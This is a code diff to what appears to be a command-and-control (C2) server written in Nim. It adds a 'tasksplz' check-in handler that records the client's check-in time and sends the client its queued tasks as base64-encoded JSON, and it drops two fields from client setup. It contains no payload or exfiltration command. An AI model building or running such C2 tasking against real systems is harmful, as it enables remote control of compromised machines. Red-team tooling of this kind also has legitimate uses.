@@ -1,4 +1,4 @@
-import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64
+import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64, times
 
 import ../types, ../logging, ../processMessage
 
@@ -31,7 +31,22 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Clien
     var response: JsonNode
     try:
       response = parseJson(decode(msgS))
-    except JsonParsingError:
+    except JsonParsingError: 
+      if msgS == "tasksplz":
+        client.lastCheckin = now()
+        msgS = ""
+        linesRecv = 0
+        var j: JsonNode = %*[]
+        for task in client.server.tasks:
+          if task.client == client[] and task.status == TaskCreated:
+            task.status = TaskNotCompleted
+            j.add %*{
+              "task": task.action,
+              "taskId": task.id,
+              "data": task.arguments
+            }
+
+        await tcpSocket.socket.send(encode($j) & "\r\n")
       continue
 
     msgS = ""
@@ -65,8 +80,6 @@ proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.a
     let 
       (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
       client = C2Client(
-        listenerType: "tcp",
-        listenerId: id,
         id: server.clients.len,
         connected: true,
         loaded: false,
